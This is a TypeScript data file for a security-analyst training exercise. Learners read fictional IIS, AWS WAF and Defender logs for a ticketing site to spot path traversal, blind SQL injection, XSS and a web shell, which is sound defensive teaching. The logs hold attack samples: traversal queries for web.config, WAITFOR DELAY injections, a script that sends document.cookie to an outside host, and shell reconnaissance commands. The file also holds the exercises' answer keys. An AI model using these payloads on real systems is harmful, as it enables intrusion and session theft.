import type { RoomExperience } from "./types";

// "Operation Open Sesame" for the "web-attacks-practice" room.
// Script: docs/campaign/52-web-attacks-practice.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Sundial Tickets (fictional), not the graded tasks' Orbitline records.
// FIELD-LAB PILOT (SPEC-field-labs.md, Tal 2026-11-15): every lab is analyst work on a native
// artifact, no games. Signature mechanic: reader (read the partner portal's IIS log for outcome).
// Mix: reader + queue (WAF review) + trace (WAF-to-IIS join) + reader (Defender rows on the host).
// The labs practise the graded skills on other data: path traversal and blind time-based SQLi (not
// the graded UNION and its baseline), a COUNT-mode XSS join on Sundial's load balancer (not
// Orbitline's ALB name or clientIp), and the shell's compile step against a Web Deploy release
// (not the graded chain order or the KQL blanks).

// One IIS W3C line in the field order the partner portal logs (see the lab's #Fields header).
const PARTNER_IP = "198.51.100.66";
const PROBE_IP = "203.0.113.74";
const EDGE_UA = "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/130.0.0.0+Safari/537.36+Edg/130.0.0.0";
const CURL_UA = "curl/8.4.0";
function w3c(time: string, method: string, stem: string, query: string, user: string, ip: string, ua: string, status: string, scBytes: number, csBytes: number, ms: number): string {
  return `2026-11-04 ${time} 10.40.2.15 ${method} ${stem} ${query} 443 ${user} ${ip} ${ua} - ${status} ${scBytes} ${csBytes} ${ms}`;
}

export const WEB_ATTACKS_PRACTICE: RoomExperience = {
  roomId: "web-attacks-practice",
  codename: "Operation Open Sesame",
  theme: "webops",
  handler: { name: "Rafael Quintero", role: "Application Security Analyst, Sundial Tickets" },
  briefing: [
    "Sundial Tickets. Concerts, trains and football, 9 million bookings a year, and one website that has to stay up the moment a big tour goes on sale.",
    "Every web attack leaves two sets of footprints: what the firewall in front decided, and what the server behind it actually did. Most analysts only read one.",
    "Rafael Quintero's rule is short: a payload in a log is an attempt, and an attempt isn't a breach until something else says so.",
    "Learn to read an access log, review the WAF's calls, join two records of one request, then follow a real case from the first probe to a shell.",
  ],
  mission: "Read the partner portal's log for what actually came back, work the morning WAF review, join WAF and server records to find what slipped through, then work the graded injection case to the end.",
  estimate: "~45 min",
  look: { primary: "#fb923c", secondary: "#a3e635", warn: "#f43f5e" },
  scene: "facilitywebattackspractice",
  layout: "facility",
  story: {
    intro: { title: "Tour Day", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/web-attacks-practice/opensesame-intro-1fc9e8d2.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/web-attacks-practice/opensesame-intro-066c8079.jpg" },
    afterStation: {
      log: { title: "One 200", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/web-attacks-practice/opensesame-ch2-9123b67d.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/web-attacks-practice/opensesame-ch2-7addb8a8.jpg" },
      one200: { title: "Two Witnesses", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/web-attacks-practice/opensesame-ch3-493b15fd.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/web-attacks-practice/opensesame-ch3-f0e5c6f2.jpg" },
      shell: { title: "Open Sesame", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/web-attacks-practice/opensesame-finale-212becac.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/web-attacks-practice/opensesame-finale-da116868.jpg" },
    },
  },
  stations: [
    {
      id: "log",
      label: "The Access Log",
      topic: "Reading an IIS access log · status codes as outcome, not intent",
      tagline: "What did the server actually do?",
      building: "control",
      taskIds: ["web-r1", "web-q1"],
    },
    {
      id: "one200",
      label: "One 200",
      topic: "One success in a wall of errors",
      tagline: "Work the graded log",
      building: "lab",
      taskIds: ["web-la1"],
    },
    {
      id: "tworecords",
      label: "Two Records",
      topic: "Why you need the WAF record and the web-server record",
      tagline: "One request, two witnesses",
      building: "office",
      taskIds: ["web-r2", "web-la2", "web-f1"],
    },
    {
      id: "scan",
      label: "Scan or Attack",
      topic: "Telling an authorized scan from a real attacker",
      tagline: "Same payloads, different story",
      building: "vault",
      taskIds: ["web-q2", "web-ac1"],
    },
    {
      id: "shell",
      label: "The Web Shell",
      topic: "The chain from first probe to code execution · detecting it",
      tagline: "Finish the story",
      building: "ticket",
      taskIds: ["web-o1", "web-qf1"],
      boss: true,
    },
  ],
  personas: {
    "web-q1": { name: "Rafael Quintero", role: "Application Security Analyst", line: "37 errors, 3 successes. Which check separates the real ones?" },
    "web-la1": { name: "Rafael Quintero", role: "Application Security Analyst", line: "Forty requests, one that looks different. Read it." },
    "web-la2": { name: "Rafael Quintero", role: "Application Security Analyst", line: "Same request, two records, two different IPs. Which one do you trust?" },
    "web-f1": { name: "Rafael Quintero", role: "Application Security Analyst", line: "Which load balancer handed it over? Read it from the WAF side." },
    "web-q2": { name: "Rafael Quintero", role: "Application Security Analyst", line: "Identical payloads, one's a scan, one isn't. What tells you?" },
    "web-ac1": { name: "Rafael Quintero", role: "Application Security Analyst", line: "SQLi signatures everywhere. Read the note before you escalate." },
  },
  briefings: {
    // ── Reading 1: read the outcome in Sundial's own IIS log, then work the WAF review ──
    "web-r1": [
      {
        kind: "reader",
        title: "Read the Partner Portal Log",
        prompt: "Rafael pulls ten minutes of the partner portal's IIS log, the one server Sundial still publishes straight to the internet. Somebody went shopping in it. Work out what they tried and what actually came back.",
        source: "u_ex261104.log · WEB-SDT05 (partners.sundialtickets.com) · IIS 10",
        header: [
          "#Software: Microsoft Internet Information Services 10.0",
          "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken",
        ],
        lines: [
          w3c("10:02:11", "GET", "/partners/statement.ashx", "file=STMT-2026-09.pdf", "p.hale", PARTNER_IP, EDGE_UA, "200 0 0", 84213, 512, 61),
          w3c("10:02:40", "GET", "/partners/venues.aspx", "q=O%27Neill+Arena", "p.hale", PARTNER_IP, EDGE_UA, "200 0 0", 14522, 498, 38),
          w3c("10:03:05", "GET", "/partners/export.aspx", "month=2026-10", "p.hale", PARTNER_IP, EDGE_UA, "500 0 0", 3120, 470, 212),
          w3c("10:04:12", "GET", "/backup.zip", "-", "-", PROBE_IP, CURL_UA, "404 0 2", 1245, 160, 3),
          w3c("10:04:12", "GET", "/.git/config", "-", "-", PROBE_IP, CURL_UA, "404 0 2", 1245, 162, 2),
          w3c("10:04:13", "GET", "/web.config.bak", "-", "-", PROBE_IP, CURL_UA, "404 0 2", 1245, 165, 2),
          w3c("10:04:13", "GET", "/admin/", "-", "-", PROBE_IP, CURL_UA, "404 0 2", 1245, 158, 3),
          w3c("10:04:14", "GET", "/partners/login.aspx", "-", "-", PROBE_IP, CURL_UA, "200 0 0", 5870, 160, 9),
          w3c("10:05:31", "GET", "/partners/statement.ashx", "file=../web.config", "-", PROBE_IP, CURL_UA, "404 0 0", 1245, 180, 4),
          w3c("10:05:32", "GET", "/partners/statement.ashx", "file=..%2F..%2Fweb.config", "-", PROBE_IP, CURL_UA, "404 0 0", 1245, 186, 4),
          w3c("10:05:34", "GET", "/partners/statement.ashx", "file=..%5C..%5Cweb.config", "-", PROBE_IP, CURL_UA, "200 0 0", 6412, 186, 7),
          w3c("10:06:02", "GET", "/partners/statement.ashx", "file=..%5C..%5CApp_Data%5Cpartners.mdf", "-", PROBE_IP, CURL_UA, "404 0 0", 1245, 205, 4),
          w3c("10:07:40", "GET", "/partners/events.aspx", "city=Leeds", "-", PROBE_IP, CURL_UA, "200 0 0", 22841, 172, 41),
          w3c("10:07:52", "GET", "/partners/events.aspx", "city=Leeds%27;WAITFOR+DELAY+%270:0:5%27--", "-", PROBE_IP, CURL_UA, "200 0 0", 22841, 212, 5047),
          w3c("10:08:03", "GET", "/partners/events.aspx", "city=Leeds%27;WAITFOR+DELAY+%270:0:9%27--", "-", PROBE_IP, CURL_UA, "200 0 0", 22841, 212, 9052),
          w3c("10:09:15", "GET", "/partners/statement.ashx", "file=STMT-2026-10.pdf", "p.hale", PARTNER_IP, EDGE_UA, "200 0 0", 91876, 512, 58),
        ],
        notes: {
          0: "Line 1 is the partner p.hale downloading her own September statement: a PDF of about 84 KB, the normal size for this endpoint.",
          1: "Line 2 is p.hale searching for a venue called O'Neill Arena. The %27 is an apostrophe in a name, and the page answered normally in 38 ms.",
          2: "Line 3 is a logged-in partner's export breaking with a 500. Nothing in the query is hostile: that is a bug to report, not an attack.",
          3: "Line 4 is a 404 with sc-win32-status 2: IIS looked for the file and it does not exist. A guess that missed.",
          4: "Line 5 is a 404 with sc-win32-status 2: a guess at a .git folder that is not there.",
          5: "Line 6 is a 404 with sc-win32-status 2: a guess at a backup copy that is not there.",
          6: "Line 7 is a 404 with sc-win32-status 2: there is no /admin/ on this site.",
          7: "Line 8 is the login page answering 200 with 5,870 bytes: a page that exists, found by the sweep. Nothing was taken from it.",
          8: "Line 9 asked for ../web.config and got a 404 of 1,245 bytes, the same size as every not-found page: that path did not work.",
          9: "Line 10 tried the same climb with encoded forward slashes and got the same 1,245-byte 404: still nothing.",
          11: "Line 12 went after the partner database file and got a 404: that one failed.",
          12: "Line 13 is the attacker's control request: an ordinary city search, 41 ms. It sets the normal time to compare against.",
          13: "Line 14 is a 200 of the normal size, but time-taken is 5,047 ms: the database was told to wait 5 seconds and did.",
          14: "Line 15 is a 200 of the normal size, but time-taken is 9,052 ms: asked for 9 seconds, it waited 9.",
          15: "Line 16 is p.hale downloading her October statement, 91,876 bytes: the normal size.",
        },
        objectives: [
          {
            id: "file", type: "line", answer: [10],
            task: "The attacker tried to climb out of the statements folder. Tap the request that actually got a file back.",
            hint: "Filter on statement.ashx. Compare sc-status and sc-bytes: a miss is 1,245 bytes every time.",
            why: "Line 11: backslashes (%5C) got past the path check, the server answered 200, and 6,412 bytes came back. A statement is 84-92 KB, so this is not a statement: it is a small text file, web.config, with the site's connection strings in it.",
          },
          {
            id: "bytes", type: "value", answer: ["6412", "6,412"],
            task: "Copy the sc-bytes of that request. It is the number that proves something other than a statement came back.",
            hint: "sc-bytes is the third number from the end of the line (sc-bytes, cs-bytes, time-taken).",
            why: "6,412 bytes against 84,213 and 91,876 for real statements. The status says the request worked; the size says what it returned was not what the endpoint is for.",
          },
          {
            id: "sweep", type: "count", answer: 4, match: "203\\.0\\.113\\.74 .* 404 0 2 ",
            task: "Before that, the same address swept for files that do not exist. How many requests did IIS answer 404 with sc-win32-status 2 (file not found)?",
            hint: "Filter on the attacker's address, then read the three status numbers after the referer: 404 0 2.",
            why: "Four guesses (backup.zip, .git/config, web.config.bak, /admin/), all 404 with Windows error 2, inside two seconds. The 404s on statement.ashx are 404 0 0: the handler said no, not IIS, so they are not part of the sweep.",
          },
          {
            id: "blind", type: "line", answer: [13, 14],
            task: "All the events.aspx requests returned 200 and the same 22,841 bytes. Tap one that shows the database was made to wait.",
            hint: "Status and size are identical. Read the last field, time-taken in milliseconds, against the 41 ms control request.",
            why: "WAITFOR DELAY '0:0:5' took 5,047 ms and '0:0:9' took 9,052 ms. The time followed the number the attacker sent: the parameter runs SQL. Blind injection never changes the status or the size, only the time.",
          },
          {
            id: "quote", type: "line", answer: [1],
            task: "Not every quote is an attack. Tap the line where %27 is an ordinary customer.",
            hint: "Find every %27 in the queries. Who sent each one, and what came after the quote?",
            why: "Line 2: a logged-in partner searching for O'Neill Arena, answered in 38 ms. In lines 14 and 15 the quote ends a string and a WAITFOR follows: that is SQL, not a surname.",
          },
        ],
        lesson: "The query string is the attempt. sc-status, sc-bytes and time-taken are the outcome: a 200 with the wrong size means something else came back, and a 200 with the wrong time means the database did as it was told.",
        fieldNote: "This is the first pass on any IIS server in an investigation. In Microsoft Sentinel the same log is the `W3CIISLog` table: filter `csUriQuery` for `..` and `%5C`, then sort the 200s by `scBytes` against the endpoint's normal size, and by `TimeTaken` for blind injection. Next step here: web.config holds the site's secrets, so every connection string in it gets rotated.",
      },
      {
        kind: "queue",
        title: "Tuesday's WAF Review",
        prompt: "The big tour went on sale this morning. Five alerts are waiting from the web tier. For each one, decide what the record shows and what Sundial should do with it.",
        console: "SIEM · Web alerts · sundial-web-acl + booking-api · Status: New",
        actions: [
          { id: "fp", label: "Close: false positive, request a rule exclusion", tone: "close" },
          { id: "blocked", label: "Close: attack blocked at the WAF", tone: "close" },
          { id: "tp", label: "Escalate: it reached the application", tone: "escalate" },
        ],
        alerts: [
          { id: "obrien", time: "09:41", severity: "Medium", rule: "AWS WAF - SQLi rule blocked a request", entity: "198.51.100.212 · POST /api/profile",
            fields: [{ k: "action", v: "BLOCK" }, { k: "terminatingRuleId", v: "AWS-AWSManagedRulesSQLiRuleSet" }, { k: "terminatingRuleMatchDetails", v: "SQL_INJECTION · BODY · surname=O'Brien" }, { k: "same client, last hour", v: "11 requests, all ALLOW, an ordinary booking path" }],
            context: "A customer updating their profile on the way to checkout. The only match is the apostrophe in the surname field.", answer: "fp", why: "One quote in a name field, from a client whose whole session is an ordinary booking. The rule misfired on a real customer: close as false positive and ask for a scoped exclusion on the surname field, so the O'Briens can buy tickets." },
          { id: "trav", time: "09:52", severity: "High", rule: "AWS WAF - Local file inclusion blocked", entity: "203.0.113.31 · GET /files",
            fields: [{ k: "action", v: "BLOCK" }, { k: "terminatingRuleId", v: "AWS-AWSManagedRulesCommonRuleSet" }, { k: "rule", v: "GenericLFI_QUERYARGUMENTS" }, { k: "httpRequest.args", v: "doc=../../web.config" }, { k: "IIS record for the request", v: "none" }],
            context: "One request, blocked at the edge. The web server has no record of it.", answer: "blocked", why: "A real attack, and the WAF did its job: BLOCK, and no IIS line, so it never reached the server. Close as an attack blocked at the WAF, and keep the address on the case board in case it comes back." },
          { id: "qty", time: "10:06", severity: "High", rule: "booking-api - Basket total below zero", entity: "basket 7781-QX · user k.mendes",
            fields: [{ k: "request", v: "POST /basket {\"seat\":\"B-14\",\"qty\":-2}" }, { k: "WAF action", v: "ALLOW (no rule matched)" }, { k: "basket total", v: "-£148.00" }, { k: "response", v: "200, order 4491-SD created" }],
            context: "The booking API's own business rule fired after the order was created. Nothing in the request has a special character.", answer: "tp", why: "A logic attack: a negative quantity that turns the total below zero. No WAF rule can match it, because nothing in it is malformed, and the order was created. Escalate: it reached the application, and the order has to be stopped before it is fulfilled." },
          { id: "kw", time: "10:15", severity: "Low", rule: "AWS WAF - Custom rule blocked a request", entity: "198.51.100.140 · GET /search",
            fields: [{ k: "action", v: "BLOCK" }, { k: "terminatingRuleId", v: "sundial-block-sql-keywords" }, { k: "rule statement", v: "query string CONTAINS \"select\"" }, { k: "httpRequest.args", v: "q=select+seats+front+row" }],
            context: "A fan searching the seat map. Sundial's own custom rule blocks any query string with the word select in it.", answer: "fp", why: "English, not SQL. A keyword rule cannot tell the two apart, which is why the managed rule sets parse syntax instead. Close as false positive and ask for the custom rule to be retired or narrowed." },
          { id: "xss", time: "10:22", severity: "Medium", rule: "AWS WAF - XSS rule blocked a request", entity: "203.0.113.31 · GET /review",
            fields: [{ k: "action", v: "BLOCK" }, { k: "terminatingRuleId", v: "AWS-AWSManagedRulesCommonRuleSet" }, { k: "rule", v: "CrossSiteScripting_QUERYARGUMENTS" }, { k: "httpRequest.args", v: "text=<script src=//x.example/a.js>" }, { k: "IIS record for the request", v: "none" }],
            context: "The same source as the 09:52 traversal attempt, now trying a script tag in the review form.", answer: "blocked", why: "Blocked, with no IIS record: it never reached the review page. Close as an attack blocked at the WAF, and note on the case that 203.0.113.31 is two for two: worth a block rule of its own if it keeps coming." },
        ],
        fieldNote: "This is the morning WAF review. In AWS WAF logs read `action`, `terminatingRuleId` and `terminatingRuleMatchDetails` together. A block on a real customer's value is a request for a scoped exclusion, never a silent close. A BLOCK with no web-server record never reached the application. Logic abuse such as a negative quantity matches no WAF rule at all: it only shows in the application's own logs.",
      },
    ],
    // ── Reading 2: join the two witnesses of one request ──
    "web-r2": [
      {
        kind: "trace",
        title: "Join the Two Witnesses",
        prompt: "The booking site sits behind a load balancer, and new WAF rules run in COUNT mode for the rollout. Start from the web server, join its line to the WAF, and find out what got through and who sent it.",
        lead: "IIS on WEB-SDT01, 14:20 UTC: a search page answered 200 to a query with a script tag in it.",
        steps: [
          {
            id: "iis", source: "IIS · WEB-SDT01 · u_ex261104.log · 14:20:00-14:20:20 UTC",
            ask: "Which request carried a script and was served?",
            columns: ["time (UTC)", "cs-method", "cs-uri-stem", "cs-uri-query", "c-ip", "sc-status", "sc-bytes"],
            rows: [
              ["14:20:03", "GET", "/events/search", "q=Coldplay+Leeds", "10.30.4.11", "200", "18204"],
              ["14:20:09", "GET", "/events/search", "q=%3Cscript%3Efetch(%27//203.0.113.90/c?%27%2Bdocument.cookie)%3C/script%3E", "10.30.4.11", "200", "18377"],
              ["14:20:15", "GET", "/events/item", "id=8812", "10.30.4.11", "200", "9410"],
            ],
            answer: 1,
            why: "A script that sends the visitor's cookies to 203.0.113.90, served with a 200. Every row shows c-ip 10.30.4.11, the load balancer: the web server cannot tell you who sent it.",
            learned: "14:20:09 GET /events/search with a cookie-stealing script, served 200 (c-ip = load balancer)",
          },
          {
            id: "waf", source: "AWS WAF · sundial-web-acl · 14:20:00-14:20:20 UTC",
            ask: "Which WAF record is the same request? Match the URI, the query and a time a second or two earlier.",
            columns: ["time (UTC)", "action", "terminatingRuleId", "nonTerminatingMatchingRules", "uri", "args", "clientIp"],
            rows: [
              ["14:20:02", "ALLOW", "Default_Action", "-", "/events/search", "q=Coldplay+Leeds", "198.51.100.37"],
              ["14:20:07", "BLOCK", "AWS-AWSManagedRulesCommonRuleSet", "-", "/events/search", "q=<script>alert(1)</script>", "203.0.113.90"],
              ["14:20:08", "ALLOW", "Default_Action", "CrossSiteScripting_QUERYARGUMENTS (COUNT)", "/events/search", "q=<script>fetch('//203.0.113.90/c?'+document.cookie)</script>", "203.0.113.90"],
              ["14:20:14", "ALLOW", "Default_Action", "-", "/events/item", "id=8812", "198.51.100.52"],
            ],
            answer: 2,
            why: "Same URI and query, one second before the IIS line. The action is ALLOW, but nonTerminatingMatchingRules shows the XSS rule in COUNT: it matched, logged, and let it pass. The 14:20:07 record is a different request: it was blocked, so it has no IIS line.",
            learned: "WAF: an XSS rule in COUNT let it through · real client 203.0.113.90",
          },
          {
            id: "probe", source: "AWS WAF · sundial-web-acl · clientIp 203.0.113.90 · 13:00-15:00 UTC",
            ask: "Scope the sender. Which of its requests came first and told it the search page prints back what you type?",
            columns: ["time (UTC)", "action", "terminatingRuleId", "nonTerminatingMatchingRules", "uri", "args"],
            rows: [
              ["13:58:41", "ALLOW", "Default_Action", "-", "/events/search", "q=test%22%3E%3Cb%3E"],
              ["14:20:07", "BLOCK", "AWS-AWSManagedRulesCommonRuleSet", "-", "/events/search", "q=<script>alert(1)</script>"],
              ["14:20:08", "ALLOW", "Default_Action", "CrossSiteScripting_QUERYARGUMENTS (COUNT)", "/events/search", "q=<script>fetch('//203.0.113.90/c?'+document.cookie)</script>"],
            ],
            answer: 0,
            why: "q=test\"><b> matches no rule: a quote, a bracket and a bold tag, to see whether the page prints them back unescaped. Probe at 13:58, blocked test at 14:20:07, working payload a second later under a COUNT rule: the sender worked around the rules on purpose.",
            learned: "13:58:41 probe from 203.0.113.90: the chain starts here",
          },
        ],
        fieldNote: "In the shift this join is a query, not a squint: AWS WAF logs (`httpRequest.uri`, `httpRequest.args`, `action`, `nonTerminatingMatchingRules`, `httpRequest.clientIp`) against the IIS log on URI, query and a window of about two seconds. Before you trust a WAF, list which of its rules are still in COUNT: they log the attack and let it in.",
      },
    ],
    // ── Web shell station: read what the IIS worker did on the host ──
    "web-o1": [
      {
        kind: "reader",
        title: "What the Worker Did",
        prompt: "Defender raised nothing on WEB-SDT01, but Rafael wants to know what the IIS worker did overnight. He runs one Advanced hunting query for every file write and child process of w3wp.exe and of Web Deploy. Read the result.",
        source: "Advanced hunting · DeviceFileEvents + DeviceProcessEvents · DeviceName WEB-SDT01 · last 24h",
        header: ["Timestamp (UTC)       ActionType      InitiatingProcess  FileName / ProcessCommandLine                                     FolderPath"],
        lines: [
          "2026-11-04 21:58:02   FileCreated     msdeploy.exe       Default.aspx                                                      D:\\sites\\sundial\\",
          "2026-11-04 21:58:02   FileCreated     msdeploy.exe       bundle.min.js                                                     D:\\sites\\sundial\\assets\\",
          "2026-11-04 22:00:40   ProcessCreated  w3wp.exe           csc.exe /noconfig /fullpaths @\"...\\Temporary ASP.NET Files\\root\\8f3a2c1d\\4b7e90a2\\xk2lqw3m.cmdline\"",
          "2026-11-04 22:00:41   ProcessCreated  csc.exe            cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 \"/OUT:...\\RES8D41.tmp\"",
          "2026-11-05 02:41:17   FileCreated     w3wp.exe           seat-map-preview.aspx                                             D:\\sites\\sundial\\uploads\\venue-maps\\",
          "2026-11-05 02:41:50   ProcessCreated  w3wp.exe           csc.exe /noconfig /fullpaths @\"...\\Temporary ASP.NET Files\\root\\8f3a2c1d\\4b7e90a2\\q0zt5vfa.cmdline\"",
          "2026-11-05 02:41:58   ProcessCreated  w3wp.exe           cmd.exe /c whoami /all",
          "2026-11-05 02:42:20   ProcessCreated  w3wp.exe           cmd.exe /c nltest /dclist:sundial.local",
        ],
        notes: {
          0: "Line 1: msdeploy.exe is Web Deploy writing the site's own page during the 21:58 release. Who wrote the file matters more than its extension.",
          1: "Line 2: Web Deploy writing a script bundle in the same release.",
          2: "Line 3: ASP.NET compiling pages after the 21:58 release, on their first request. w3wp.exe starting csc.exe is normal on its own.",
          3: "Line 4: the compiler's own helper, started by csc.exe as part of the same build.",
          5: "Line 6: ASP.NET compiling the new .aspx the first time it was requested, 33 seconds after it landed. Normal machinery, abnormal file.",
          7: "Line 8: the second command run through the shell, already looking for domain controllers.",
        },
        objectives: [
          {
            id: "landed", type: "line", answer: [4],
            task: "Tap the line where a web shell landed on disk.",
            hint: "Two processes write .aspx files here. Which one is the site's own worker, writing into a folder customers upload to?",
            why: "w3wp.exe, the site itself, wrote seat-map-preview.aspx at 02:41, outside any release, into the uploads folder. Web Deploy's writes at 21:58 are the release; this one is not.",
          },
          {
            id: "folder", type: "value", answer: ["D:\\sites\\sundial\\uploads\\venue-maps\\", "D:\\sites\\sundial\\uploads\\venue-maps"],
            task: "Copy the folder it landed in. It is where you look for anything else the attacker uploaded.",
            hint: "The last column of the line you just found.",
            why: "An uploads folder that the site will also execute .aspx from. List every script file in it, and check whether IIS should run code there at all.",
          },
          {
            id: "compile", type: "line", answer: [5],
            task: "w3wp.exe started csc.exe twice. Tap the time it was compiling the shell, not the site.",
            hint: "ASP.NET compiles a page the first time it is requested. Which csc.exe comes right after the shell was written?",
            why: "02:41:50, 33 seconds after the shell landed and 8 seconds before the first cmd.exe: the attacker's first request to seat-map-preview.aspx. The 22:00 compile follows the release. That is why w3wp.exe starting csc.exe is a noisy detection on its own.",
          },
          {
            id: "first", type: "line", answer: [6],
            task: "Tap the first command the attacker ran through the shell.",
            hint: "Look for a command interpreter started by w3wp.exe.",
            why: "cmd.exe /c whoami /all: who am I and what privileges do I have. A web worker never needs a shell; this is the shell being used.",
          },
          {
            id: "shells", type: "count", answer: 2, match: "w3wp\\.exe\\s+cmd\\.exe",
            task: "How many command shells did w3wp.exe start? Leave the compiler out.",
            hint: "Filter on cmd.exe.",
            why: "Two: whoami and nltest /dclist, the second one already looking for domain controllers. The compiler lines are ASP.NET's own and are left out on purpose.",
          },
        ],
        lesson: "A web shell is two facts on the host: the site's own worker writing a script file outside a release, and the same worker starting a shell. The compiler in between is normal machinery, so a good detection leaves it out.",
        fieldNote: "In Defender for Endpoint these are two Advanced hunting tables: `DeviceFileEvents` where InitiatingProcessFileName is w3wp.exe and the file ends in .aspx, .ashx or .asmx, and `DeviceProcessEvents` for w3wp.exe children with csc.exe and cvtres.exe excluded. Next step: find the first request to seat-map-preview.aspx in the IIS log and the WAF, to learn who called it.",
      },
    ],
  },
};
